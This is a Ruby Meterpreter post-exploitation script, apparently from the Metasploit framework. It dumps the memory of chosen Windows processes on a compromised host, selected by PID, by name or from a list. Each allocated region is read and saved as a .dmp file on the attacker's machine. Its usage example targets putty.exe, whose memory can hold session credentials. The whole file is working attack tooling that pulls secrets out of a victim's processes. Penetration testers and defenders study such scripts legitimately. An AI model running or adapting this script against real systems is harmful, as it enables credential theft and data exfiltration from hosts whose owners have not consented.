# Author: Carlos Perez at carlos_perez[at]darkoperator.com
# Note: Script is based on the paper Neurosurgery With Meterpreter by
#	Colin Ames (amesc[at]attackresearch.com) David Kerb (dkerb[at]attackresearch.com)
#-------------------------------------------------------------------------------
################## Variable Declarations ##################
require 'fileutils'
@client = client
pid = nil
name = nil
toggle = nil
resource = nil
query = false

@exec_opts = Rex::Parser::Arguments.new(
	"-h" => [ false, "Help menu." ],
	"-p" => [ true, "PID of process to dump."],
	"-n" => [ true, "Name of process to dump."],
	"-r" => [ true, "Text file wih list of process names to dump memory for, one per line."],
	"-t" => [ false, "toggle location information in dump."],
	"-q" => [false, "Query the size of the Process that would be dump in bytes."]
)

def usage
	print_line("")
	print_line("USAGE:")
	print_line("EXAMPLE: run process_memdump putty.exe")
	print_line("EXAMPLE: run process_memdump -p 1234")
	print_line(@exec_opts.usage)
	raise Rex::Script::Completed
end

@exec_opts.parse(args) { |opt, idx, val|
	case opt
	when "-h"
		usage
	when "-p"
		pid = val
	when "-n"
		name = val
	when "-t"
		toggle = true
	when "-q"
		query = true
	when "-r"
		list = val
		resource = ""
		if not ::File.exists?(list)
			raise "Command List File does not exists!"
		else
			::File.open(list, "r").each_line do |line|
				resource << line
			end
		end
	end
}


# Function for finding the name of a process given it's PID
def find_procname(pid)
	name = nil
	@client.sys.process.get_processes.each do |proc|
		if proc['pid'] == pid.to_i
			name = proc['name']
		end
	end
	return name
end

# Find all PID's for a given process name
def find_pids(name)
	proc_pid = []
	@client.sys.process.get_processes.each do |proc|
		if proc['name'].downcase == name.downcase
			proc_pid << proc['pid']
		end
	end
	return proc_pid
end

# Dumps the memory for a given PID
def dump_mem(pid,name, toggle)
	host,port = @client.session_host, session.session_port
	# Create Filename info to be appended to created files
	filenameinfo = "_#{name}_#{pid}_" + ::Time.now.strftime("%Y%m%d.%M%S")
	# Create a directory for the logs
	logs = ::File.join(Msf::Config.log_directory, 'scripts', 'proc_memdump')
	# Create the log directory
	::FileUtils.mkdir_p(logs)
	#Dump file name
	dumpfile = logs + ::File::Separator + host + filenameinfo + ".dmp"
	print_status("\tDumping Memory of #{name} with PID: #{pid.to_s}")
	begin
		dump_process = @client.sys.process.open(pid.to_i, PROCESS_READ)
	rescue
		print_error("Could not open process for reading memory!")
		raise Rex::Script::Completed
	end
	# MaximumApplicationAddress for 32bit or close enough
	maximumapplicationaddress = 2147418111
	base_size = 0
	while base_size < maximumapplicationaddress
		mbi = dump_process.memory.query(base_size)
		# Check if Allocated
		if mbi["Available"].to_s == "false"
			file_local_write(dumpfile,mbi.inspect) if toggle
			file_local_write(dumpfile,dump_process.memory.read(mbi["BaseAddress"],mbi["RegionSize"]))
			print_status("\tbase size = #{base_size/1024}")
		end
		base_size += mbi["RegionSize"]
	end
	print_status("Saving Dumped Memory to #{dumpfile}")

end

# Function to query process Size
def get_mem_usage( pid )
	p = @client.sys.process.open( pid.to_i, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ )
	if( p )
		begin

			if( not @client.railgun.get_dll( 'psapi' ) )
				@client.railgun.add_dll( 'psapi' )
			end

			# http://msdn.microsoft.com/en-us/library/ms683219%28v=VS.85%29.aspx
			if( not @client.railgun.psapi.functions['GetProcessMemoryInfo'] )
				@client.railgun.psapi.add_function( 'GetProcessMemoryInfo', 'BOOL', [
					[ "HANDLE", "hProcess", "in" ],
					[ "PBLOB", "ProcessMemoryCounters", "out" ],
					[ "DWORD", "Size", "in" ]
					]
				)
			end

			r = @client.railgun.psapi.GetProcessMemoryInfo( p.handle, 72, 72 )
			if( r['return'] )
				pmc = r['ProcessMemoryCounters']
				# unpack the PROCESS_MEMORY_COUNTERS structure (http://msdn.microsoft.com/en-us/library/ms684877%28v=VS.85%29.aspx)
				# Note: As we get the raw structure back from railgun we need to account
				#       for SIZE_T variables being 32bit on x86 and 64bit on x64
				mem = nil
				if( @client.platform =~ /win32/ )
					mem = pmc[12..15].unpack('V').first
				elsif( @client.platform =~ /win64/ )
					mem = pmc[16..23].unpack('Q').first
				end
				return (mem/1024)
			end
		rescue
			p "Exception - #{$!}"
		end

		p.close
	end

	return nil
end

# Main
if client.platform =~ /win32|win64/
	if resource
		resource.each do |r|
			next if r.strip.length < 1
			next if r[0,1] == "#"
			print_status("Dumping memory for #{r.chomp}") if not query
			pids = find_pids(r.chomp)
			if pids.length == 0
				print_status("\tProcess #{r.chomp} not found!")
				next
			end
			pids.each do |p|
				print_status("\tsize for #{r.chomp} in PID #{p} is #{get_mem_usage(p)}K") if query
				dump_mem(p,r.chomp,toggle) if not query
			end
		end
	elsif pid
		name = find_procname(pid)
		print_status("\tsize for #{name} in PID #{pid} is #{get_mem_usage(p)}K") if query
		print_status("Dumping memory for #{name}") if not query
		dump_mem(pid,name,toggle) if not query
	elsif name
		print_status("Dumping memory for #{name}") if not query
		find_pids(name).each do |p|
			print_status("\tsize for #{name} in PID #{p} is #{get_mem_usage(p)}K") if query
			dump_mem(p,name,toggle) if not query
		end
	else
		usage
	end
else
	print_error("This version of Meterpreter is not supported with this Script!")
	raise Rex::Script::Completed
end
